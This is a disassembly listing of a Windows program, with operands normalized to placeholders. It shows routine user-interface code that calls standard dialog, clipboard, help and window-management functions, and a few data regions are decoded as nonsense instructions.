sub [ rw-data ] 0x1
retn
sub_428d4d
jmp sub_403878
sub_428d54
pop ebp
retn
sub_428d58
sub [ rw-data ] 0x1
retn
GetOpenFileNameA
jmp [ __import_lookup_table_14(comdlg32:GetOpenFileNameA) ]
ChooseColorA
jmp [ ChooseColorA@IAT ]
FindTextA
jmp [ FindTextA@IAT ]
ReplaceTextA
jmp [ ReplaceTextA@IAT ]
PrintDlgA
jmp [ PrintDlgA@IAT ]
sub_428db5
jmp sub_403878
sub_428dbc
pop ebp
retn
sub_428dc0
sub [ rw-data ] 0x1
retn
sub_428ded
jmp sub_403878
sub_428df4
pop ebp
retn
sub_428df8
sub [ rw-data ] 0x1
retn
sub_42a536
jmp sub_4035c4
sub_42a53b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45d3bc
call sub_40392c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a558
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42a560
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403320
pop esi
retn
sub_42a578
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403320
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42a590
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42a639
jmp sub_403878
sub_42a667
jmp sub_403878
sub_42a66e
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a678
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42a68c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42a924
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_42a944
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_42a964
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_42a9b6
jmp sub_403878
sub_42a9bd
pop ecx
pop ebp
retn
sub_42ad05
jmp sub_403878
sub_42ad0c
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ae45
jmp sub_403878
sub_42ae4c
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42af0b
jmp sub_403878
sub_42af12
pop ebx
mov esp ebp
pop ebp
retn
sub_42afc4
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_42b02c
push ebx
mov ebx eax
mov edx GetOpenFileNameA
mov eax ebx
call sub_42aa54
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_42b044
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_42b171
jmp sub_403878
sub_42b178
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b23e
jmp sub_403878
sub_42b245
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b320
push esi
mov esi eax
mov eax [ esi + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42b424
jmp sub_403878
sub_42b4a0
jmp sub_403878
sub_42b4a7
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b532
jmp sub_403878
sub_42b76b
jmp sub_403878
sub_42b772
pop ecx
pop ebp
retn 0x8
sub_42bb64
jmp sub_4035c4
sub_42be8c
call sub_403124
retn
sub_42c214
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_42c228
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_404168
pop esi
pop ebx
retn
sub_42c244
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42c25c
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42c290
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0x1ac ]
mov ecx 0x100
call sub_404168
pop esi
pop ebx
retn
sub_42c2ac
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42c25c
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_42c3a6
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_42c68e
jmp sub_403878
sub_42c695
pop ebp
retn
sub_42c910
xchg esp eax
hlt
sub_42d2df
xchg esp eax
hlt
sub_42dc2e
xchg esp eax
hlt
sub_42e1c4
xor edx edx
mov ecx [ eax + 0x168 ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_42e3bd
jmp sub_403878
sub_42e3c4
pop ebx
mov esp ebp
pop ebp
retn
sub_42e4d0
cmp dl [ eax + 0x179 ]
je r-xdata
retn
mov [ eax + 0x179 ] dl
mov edx eax
call sub_42e540
sub_42e4e8
push esi
mov esi eax
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42e4f8
cmp dl [ eax + 0x178 ]
je r-xdata
retn
mov [ eax + 0x178 ] dl
mov edx eax
call sub_42e540
sub_42e510
cmp dl [ eax + 0x17b ]
je r-xdata
retn
mov [ eax + 0x17b ] dl
mov edx eax
call sub_42e540
sub_42e528
cmp dl [ eax + 0x17d ]
je r-xdata
retn
mov [ eax + 0x17d ] dl
mov edx eax
call sub_42e540
sub_42e792
jmp sub_4035c4
sub_42e84b
jmp sub_403878
sub_42e852
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e858
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42e7cc
sub_42e868
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42e7cc
sub_42e878
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42e7cc
pop ebp
retn 0x8
sub_42e890
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42e9bc
push ebx
mov ebx eax
mov eax ebx
call sub_443238
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42e9d0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ea04
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_42eb08
jmp sub_403878
sub_42eb0f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ecb2
jmp sub_403878
sub_42ecb9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ecc3
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ecd8
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_440520
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42ed10
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_440520
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42ed2c
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_440520
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42ed48
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_441200
sub_42ed5c
mov al [ eax + 0x220 ]
retn
sub_42eec5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_42eedd
jmp sub_403878
sub_42f1e9
jmp sub_4035c4
sub_42f35c
retn
sub_42f4e9
jmp sub_403878
sub_42f56c
push ebx
mov ebx eax
mov eax ebx
call sub_43f534
mov eax ebx
call sub_42f360
pop ebx
retn
sub_42f580
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_43fc54
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_42f6a8
pop ebx
retn
sub_42f698
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42f771
jmp sub_403878
sub_42f778
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42f7c0
push ebx
mov ebx eax
mov eax ebx
call sub_4431bc
mov eax ebx
call sub_42f360
pop ebx
retn
sub_42f7d4
push ebx
mov ebx eax
mov eax ebx
call sub_43618c
mov eax ebx
call sub_42f360
pop ebx
retn
sub_42f7e8
mov al 0x1
retn
sub_42f7ec
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42fb85
jmp sub_403878
sub_42fb8c
pop ebp
retn
sub_42fb90
sub [ rw-data ] 0x1
retn
sub_42fbc9
jmp sub_403878
sub_42fbd0
pop ebp
retn
sub_42fbd4
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42fc50
retn
sub_42fc51
jmp sub_403878
j_sub_42fc50
jmp sub_42fc50
sub_42fc58
pop ebp
retn
sub_42fc5c
sub [ rw-data ] 0x1
retn
sub_42fd32
inc ebx
add [ eax - 0x4d ] al
inc ecx
add [ esp + eax * 8 - 0x4d6fffbd ] dl
inc ecx
add [ ebx + esi * 4 ] ah
inc ecx
add [ eax - 0x4d ] bh
inc ecx
add ah dl
retn 0x43
sub_430051
xchg esp eax
hlt
sub_4306a4
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_430e27
jmp sub_403878
sub_430e63
jmp sub_403878
sub_431a6e
jmp sub_403878
sub_431a75
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431cfc
call sub_43e9b4
retn
sub_431d04
push ebx
mov ebx eax
mov eax ebx
call sub_431d20
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_431d18
mov eax [ r-xdata ]
retn
sub_431d20
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_431d2c
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_430814
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_431d44
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_431d7c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_431e2c
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431e48
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_431d84
sub_431e5c
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431e78
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431e98
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431ef0
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_431d84
sub_431f04
push esi
mov esi eax
mov eax esi
call sub_43eb64
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_403320
sub_432051
jmp sub_403878
sub_432058
pop edi
pop esi
pop ecx
pop ebp
retn
sub_432060
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_432068
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_432070
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_4307a0
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_4308b4
pop esi
pop ebx
retn
sub_4322a0
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403124
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_432363
retn
sub_432364
jmp sub_403878
j_sub_432363
jmp sub_432363
sub_43236b
pop ebp
retn
sub_432370
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c48
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402b40
sub_432657
jmp sub_4035c4
sub_432696
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_432955
jmp sub_403878
sub_432a04
push ebx
mov ebx eax
mov eax ebx
call sub_4043b8
push eax
call GetFileAttributesA
cmp eax 0xffffffff
setne al
pop ebx
retn
sub_432b58
jmp sub_4035c4
sub_432bf4
jmp sub_403878
sub_432bfb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432c04
call sub_42a678
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45df0c
retn
sub_432cf0
jmp sub_403878
sub_432cf7
pop ebx
mov esp ebp
pop ebp
retn
sub_432cfc
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor edx edx
mov [ eax + 0x44 ] edx
test [ eax + 0x5e ] 0x1
jne r-xdata
mov edx r-xdata
mov [ eax + 0x44 ] edx
jmp r-xdata
call sub_42b02c
retn
sub_432f7a
jmp sub_403878
sub_432f81
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432f9e
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
sub_432f97
jmp sub_403878
sub_432f9e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_432fda
add [ eax ] al
cmp [ ecx ] 0x1b
jne r-xdata
retn
mov eax edx
call sub_459c24
sub_433037
jmp sub_403878
sub_43303e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_433069
jmp sub_403878
sub_433070
pop ebp
retn
sub_433074
sub [ rw-data ] 0x1
retn
sub_4330d0
jmp sub_403878
sub_4330d7
pop ebp
retn
sub_4330dc
sub [ rw-data ] 0x1
retn
sub_433138
jmp sub_403878
sub_43313f
pop ebp
retn
sub_433144
sub [ rw-data ] 0x1
retn
sub_4331a5
jmp sub_403878
sub_4331ac
pop ebp
retn
sub_4331b0
sub [ rw-data ] 0x1
retn
sub_4331fc
jmp sub_403878
sub_433203
pop ebp
retn
sub_433208
sub [ rw-data ] 0x1
retn
sub_433235
jmp sub_403878
sub_43323c
pop ebp
retn
sub_433240
sub [ rw-data ] 0x1
retn
sub_4332e8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40beb8
mov [ rw-data ] eax
sub_43331d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_433334
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_4333b7
jmp sub_403878
sub_4333be
pop ebp
retn
sub_4333c0
sub [ rw-data ] 0x1
retn
sub_43342f
jmp [ edi ]
sub_4336d0
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4336e8
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43372c
push ebx
mov ebx eax
mov eax ebx
call sub_433f88
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_433f77
jmp sub_403878
sub_433f88
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_428b0c
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_4336fc
sub_433fdf
jmp sub_403878
sub_433fe6
pop ebp
retn
sub_433fe8
sub [ rw-data ] 0x1
retn
sub_434578
xchg esp eax
hlt
sub_4350d9
xchg esp eax
hlt
sub_435822
xchg esp eax
hlt
sub_435d07
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x522d172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_4360c2
jmp sub_403878
sub_4360c9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43614e
jmp sub_403878
sub_436155
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43615c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_440520
pop ebx
retn
sub_436170
push ebx
mov ebx eax
mov eax ebx
call sub_443278
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_440520
pop ebx
retn
sub_43618c
push ebx
mov ebx eax
mov eax ebx
call sub_44224c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_436238
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d484
pop esi
pop ebx
retn
sub_4363a2
jmp sub_403878
sub_4363a9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4364b8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43f534
mov eax ebx
mov si 0xffc7
call sub_403320
pop esi
pop ebx
retn
sub_4365a4
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4365c0
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403320
sub_4365dc
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_4365e8
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41ab4c
sub_4365fc
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43665c
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4366d0
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403320
pop esi
pop ebx
retn
sub_4366ec
push esi
mov esi eax
mov eax esi
call sub_43f040
mov eax esi
mov si 0xffc7
call sub_403320
pop esi
retn
sub_436791
jmp sub_403878
sub_436798
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4367a0
push ebx
mov ebx eax
mov eax ebx
call sub_43f1a4
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_4367c4
push ebx
mov ebx eax
mov eax ebx
call sub_43f1bc
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_43689a
jmp sub_403878
sub_436944
mov eax [ r-xdata ]
retn
sub_43694c
xor eax eax
retn
sub_436970
retn
sub_436a88
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_441200
sub_436b74
push ebx
mov ebx eax
mov eax ebx
call sub_43d090
mov eax ebx
call sub_43e9b4
pop ebx
retn
sub_436b88
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_436b94
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_441200
sub_436ba8
test dl dl
je r-xdata
xor edx edx
call sub_436bbc
retn
mov dl 0x1
call sub_436bbc
retn
sub_436c98
push ebx
mov ebx eax
mov eax ebx
call sub_44224c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_436cac
call sub_441200
retn
sub_436d42
jmp sub_403878
sub_436d49
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436d50
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_436dc0
mov al [ eax + 0x211 ]
retn
sub_436df4
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_441200
sub_436fd4
call sub_441200
retn
sub_437051
jmp sub_403878
sub_437058
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4370b5
jmp sub_403878
sub_4370bc
pop ebp
retn
sub_4370c0
sub [ rw-data ] 0x1
retn
sub_43721d
jmp sub_403878
sub_437224
pop ebp
retn
sub_437228
sub [ rw-data ] 0x1
retn
sub_437230
cmpsb [ fs : esi ] [ edi ]
inc edi
add dh bh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_437aa8
sub_437241
add eax 0xffffffe0
jmp sub_437828
sub_437249
add eax 0xffffffe0
jmp sub_437890
sub_437251
add eax 0xffffffe0
jmp sub_4379a4
sub_437259
add eax 0xffffffe0
jmp sub_437a18
sub_437261
add eax 0xffffffe0
jmp sub_4374d4
sub_437269
add eax 0xffffffe0
jmp sub_4374e8
sub_437271
add eax 0xffffffe0
jmp sub_437560
sub_437279
add eax 0xffffffe0
jmp sub_437604
sub_437281
add eax 0xffffffe0
jmp sub_437608
sub_437289
add eax 0xffffffe0
jmp sub_437690
sub_437291
add eax 0xffffffe0
jmp sub_4377d8
sub_437299
add eax 0xffffffe0
jmp sub_4377dc
sub_4372a1
add eax 0xffffffe0
jmp sub_4377f8
sub_4372b3
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40566c
sub_4372bd
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405680
sub_437491
jmp sub_403878
sub_437498
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4374d4
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403f4c
pop ebx
retn
sub_43754f
jmp sub_403878
sub_437556
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4375e8
jmp sub_403878
sub_4375ef
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437604
mov al 0x1
retn
sub_437683
jmp sub_403878
sub_43768a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437788
jmp sub_403878
sub_43778f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4377d8
mov [ eax + 0xc ] edx
retn
sub_4377dc
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_437880
jmp sub_403878
sub_437887
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437986
jmp sub_403878
sub_43798d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437a06
jmp sub_403878
sub_437a0d
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437a98
jmp sub_403878
sub_437a9f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437b93
jmp sub_403878
sub_437b9a
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_437c5c
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_437ba8
call EnumWindows
retn
sub_437cee
jmp sub_403878
sub_437cf5
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_437d00
xor eax eax
retn
sub_437df9
jmp sub_403878
sub_437e00
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437eea
jmp sub_403878
sub_437ef1
pop ebp
retn
sub_437f46
jmp sub_403878
sub_437f4d
pop ebp
retn
sub_43849e
inc ebx
add [ eax - 0x4d ] al
inc ecx
add [ esp + eax * 8 - 0x4d6fffbd ] dl
inc ecx
add [ ebx + esi * 4 ] ah
inc ecx
add [ eax - 0x4d ] bh
inc ecx
add ah dl
retn 0x43
sub_4384b8
mov esp 0x48004499
retn
sub_4390b4
jmp r-xdata
sub_4390b6
0xe8ffe9ff 0xe7ff
sub_4390bd
jmp esi
sub_4393de
inc ebx
add [ eax - 0x4d ] al
inc ecx
add [ esp + eax * 8 - 0x4d6fffbd ] dl
inc ecx
add [ ebx + esi * 4 ] ah
inc ecx
add [ eax - 0x4d ] bh
inc ecx
add ah dl
retn 0x43
sub_4393f8
mov esp 0x48004499
retn
sub_43a05d
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_43a06a
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_43a077
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_43a084
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_43a091
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_43a09e
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43a0ab
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_43a0b8
add eax 0xffffff8c
jmp sub_447998
sub_43a0ca
add [ esp + 0x4 ] 0xffffff8c
jmp sub_40566c
sub_43a0d4
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405680
sub_43a210
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43a523
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_413bb8
retn
sub_43a540
push 0x15
mov ecx rw-data
call sub_413b78
retn
sub_43a62c
call GetCapture
call sub_43a310
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43a890
push ebx
push eax
push sub_43aa14
call sub_41bbc8
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43a8a8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43a8d8
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41bc7c
pop ebx
retn
sub_43a9b6
jmp sub_4035c4
sub_43a9e8
xor eax eax
retn
sub_43a9ec
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43aa04
retn
sub_43aa08
mov eax [ rw-data ]
retn
sub_43aa10
retn
sub_43aa3e
jmp sub_4035c4
sub_43aa43
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45d3bc
call sub_40392c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43aa60
call sub_40337c
xor eax eax
mov [ rw-data ] eax
retn
sub_43aa70
call sub_403378
xor eax eax
mov [ rw-data ] eax
retn
sub_43aa80
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403448
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_43ab30
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
